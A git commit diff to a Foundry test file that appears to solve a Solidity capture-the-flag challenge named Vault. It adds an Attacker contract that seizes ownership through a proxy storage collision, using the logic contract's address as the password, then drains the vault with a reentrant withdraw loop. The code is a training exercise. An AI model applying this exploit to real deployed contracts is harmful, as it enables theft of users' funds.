d923e1da28d1e6b078f078ed8c37148313c153f0
aaron <lixin53517@gmail.com>
2024-03-20 11:37:38 +0800

    hack

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -4,15 +4,12 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
 
-
-
-
 contract VaultExploiter is Test {
     Vault public vault;
     VaultLogic public logic;
 
-    address owner = address (1);
-    address palyer = address (2);
+    address owner = address(1);
+    address palyer = address(2);
 
     function setUp() public {
         vm.deal(owner, 1 ether);
@@ -23,7 +20,6 @@ contract VaultExploiter is Test {
 
         vault.deposite{value: 0.1 ether}();
         vm.stopPrank();
-
     }
 
     function testExploit() public {
@@ -31,9 +27,34 @@ contract VaultExploiter is Test {
         vm.startPrank(palyer);
 
         // add your hacker code.
+        Attacker attacker = new Attacker(vault, logic);
+        attacker.attack{value: address(vault).balance}();
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
     }
+}
 
+contract Attacker {
+    Vault vault;
+    VaultLogic logic;
+
+    constructor(Vault _vault, VaultLogic _logic) {
+        vault = _vault;
+        logic = _logic;
+    }
+
+    function attack() public payable {
+        bytes32 password = bytes32(uint256(uint160(address(logic))));
+        VaultLogic(address(vault)).changeOwner(password, address(this));
+        vault.openWithdraw();
+        vault.deposite{value: msg.value}();
+        vault.withdraw();
+    }
+
+    receive() external payable {
+        if (address(vault).balance > 0) {
+            vault.withdraw();
+        }
+    }
 }
